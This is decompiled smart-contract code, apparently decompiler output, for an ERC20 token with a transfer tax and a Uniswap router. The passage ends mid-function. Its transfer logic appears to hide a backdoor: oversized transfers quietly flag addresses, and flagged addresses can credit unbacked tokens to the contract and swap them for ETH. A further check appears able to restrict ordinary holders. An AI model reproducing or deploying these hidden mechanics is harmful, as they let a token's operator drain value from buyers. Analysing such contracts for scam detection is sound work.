contract main {




// =====================  Runtime code  =====================


address owner;
array of struct stor1;
array of struct stor2;
uint256 _taxFee;
uint8 decimals;
uint256 totalSupply;
uint256 stor6;
uint8 stor7; offset 8
address uniswapV2PairAddress; offset 16
address routerAddress;
mapping of uint256 balanceOf;
mapping of address stor10;
mapping of uint256 allowance;
mapping of uint256 stor12;
mapping of uint256 stor13;

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function _taxFee() {
    return _taxFee
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function owner() {
    return owner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function router() {
    return routerAddress
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = 0
    emit OwnershipTransferred(owner, 0);
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    owner = arg1
    emit OwnershipTransferred(owner, arg1);
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function name() {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function symbol() {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not stor7:
        if not stor13[address(msg.sender)]:
            if uniswapV2PairAddress != msg.sender:
                if stor12[address(msg.sender)] > 0:
                    if stor13[address(msg.sender)] < stor6:
                        revert with 'NH{q', 17
                    stor12[address(msg.sender)] = stor13[address(msg.sender)] - stor6
    stor12[stor10[stor6]] = stor6
    stor10[stor6] = arg1
    if stor6 >= stor13[address(arg1)]:
        if stor13[address(msg.sender)] <= 0:
            if _taxFee <= 0:
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if stor13[address(msg.sender)]:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor7:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor13[address(arg1)]:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and _taxFee > -1 / arg2:
                                revert with 'NH{q', 17
                            if arg2 < arg2 * _taxFee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2 * _taxFee / 100:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2 * _taxFee / 100
                            if balanceOf[0] > -(arg2 * _taxFee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _taxFee / 100
                            if balanceOf[address(msg.sender)] < arg2 - (arg2 * _taxFee / 100):
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * _taxFee / 100)
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _taxFee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _taxFee / 100)
                            emit Transfer((arg2 - (arg2 * _taxFee / 100)), msg.sender, arg1);
        else:
            if arg1 == uniswapV2PairAddress:
                if _taxFee <= 0:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor13[address(msg.sender)]:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor7:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor13[address(arg1)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and _taxFee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if arg2 < arg2 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2 * _taxFee / 100
                                if balanceOf[0] > -(arg2 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _taxFee / 100
                                if balanceOf[address(msg.sender)] < arg2 - (arg2 * _taxFee / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * _taxFee / 100)
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _taxFee / 100)
                                emit Transfer((arg2 - (arg2 * _taxFee / 100)), msg.sender, arg1);
            else:
                if arg2 > stor6:
                    stor13[address(arg1)] = arg2
                else:
                    if _taxFee <= 0:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor13[address(msg.sender)]:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor7:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor13[address(arg1)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and _taxFee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if arg2 < arg2 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2 * _taxFee / 100
                                    if balanceOf[0] > -(arg2 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _taxFee / 100
                                    if balanceOf[address(msg.sender)] < arg2 - (arg2 * _taxFee / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * _taxFee / 100)
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _taxFee / 100)
                                    emit Transfer((arg2 - (arg2 * _taxFee / 100)), msg.sender, arg1);
    else:
        if stor13[address(msg.sender)] <= stor6:
            if stor13[address(msg.sender)] <= 0:
                if _taxFee <= 0:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor13[address(msg.sender)]:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor7:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor13[address(arg1)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and _taxFee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if arg2 < arg2 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2 * _taxFee / 100
                                if balanceOf[0] > -(arg2 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _taxFee / 100
                                if balanceOf[address(msg.sender)] < arg2 - (arg2 * _taxFee / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * _taxFee / 100)
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _taxFee / 100)
                                emit Transfer((arg2 - (arg2 * _taxFee / 100)), msg.sender, arg1);
            else:
                if arg1 == uniswapV2PairAddress:
                    if _taxFee <= 0:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor13[address(msg.sender)]:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor7:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor13[address(arg1)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and _taxFee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if arg2 < arg2 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2 * _taxFee / 100
                                    if balanceOf[0] > -(arg2 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _taxFee / 100
                                    if balanceOf[address(msg.sender)] < arg2 - (arg2 * _taxFee / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * _taxFee / 100)
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _taxFee / 100)
                                    emit Transfer((arg2 - (arg2 * _taxFee / 100)), msg.sender, arg1);
                else:
                    if arg2 > stor6:
                        stor13[address(arg1)] = arg2
                    else:
                        if _taxFee <= 0:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor13[address(msg.sender)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor7:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if stor13[address(arg1)]:
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg2 and _taxFee > -1 / arg2:
                                            revert with 'NH{q', 17
                                        if arg2 < arg2 * _taxFee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2 * _taxFee / 100:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2 * _taxFee / 100
                                        if balanceOf[0] > -(arg2 * _taxFee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _taxFee / 100
                                        if balanceOf[address(msg.sender)] < arg2 - (arg2 * _taxFee / 100):
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * _taxFee / 100)
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _taxFee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _taxFee / 100)
                                        emit Transfer((arg2 - (arg2 * _taxFee / 100)), msg.sender, arg1);
        else:
            if balanceOf[address(this.address)] > -arg2 - 1:
                revert with 'NH{q', 17
            balanceOf[address(this.address)] += arg2
            mem[128] = this.address
            staticcall routerAddress.WETH() with:
                    gas gas_remaining wei
            mem[192] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[160] = ext_call.return_data[12 len 20]
            if not this.address:
                revert with 0, 'ERC20: approve from the zero address'
            if not routerAddress:
                revert with 0, 'ERC20: approve from the zero address'
            allowance[address(this.address)][stor8] = arg2
            emit Approval(arg2, this.address, routerAddress);
            mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 196] = arg2
            idx = 0
            s = 128
            t = ceil32(return_data.size) + 388
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(routerAddress)
            call routerAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg2, 0, 160, address(arg1), block.timestamp, 2, mem[ceil32(return_data.size) + 388 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if not stor7:
        if not stor13[address(arg1)]:
            if arg1 != uniswapV2PairAddress:
                if stor12[address(arg1)] > 0:
                    if stor13[address(arg1)] < stor6:
                        revert with 'NH{q', 17
                    stor12[address(arg1)] = stor13[address(arg1)] - stor6
    stor12[stor10[stor6]] = stor6
    stor10[stor6] = arg2
    if stor6 >= stor13[address(arg2)]:
        if stor13[address(arg1)] <= 0:
            if _taxFee <= 0:
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if stor13[address(arg1)]:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor7:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor13[address(arg2)]:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg3 and _taxFee > -1 / arg3:
                                revert with 'NH{q', 17
                            if arg3 < arg3 * _taxFee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3 * _taxFee / 100:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3 * _taxFee / 100
                            if balanceOf[0] > -(arg3 * _taxFee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg3 * _taxFee / 100
                            if balanceOf[address(arg1)] < arg3 - (arg3 * _taxFee / 100):
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * _taxFee / 100)
                            if balanceOf[address(arg2)] > -arg3 + (arg3 * _taxFee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _taxFee / 100)
                            emit Transfer((arg3 - (arg3 * _taxFee / 100)), arg1, arg2);
        else:
            if arg2 == uniswapV2PairAddress:
                if _taxFee <= 0:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor13[address(arg1)]:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor7:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor13[address(arg2)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and _taxFee > -1 / arg3:
                                    revert with 'NH{q', 17
                                if arg3 < arg3 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3 * _taxFee / 100
                                if balanceOf[0] > -(arg3 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg3 * _taxFee / 100
                                if balanceOf[address(arg1)] < arg3 - (arg3 * _taxFee / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * _taxFee / 100)
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _taxFee / 100)
                                emit Transfer((arg3 - (arg3 * _taxFee / 100)), arg1, arg2);
            else:
                if arg3 > stor6:
                    stor13[address(arg2)] = arg3
                else:
                    if _taxFee <= 0:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor13[address(arg1)]:
                            if balanceOf[address(arg1)] < arg3:
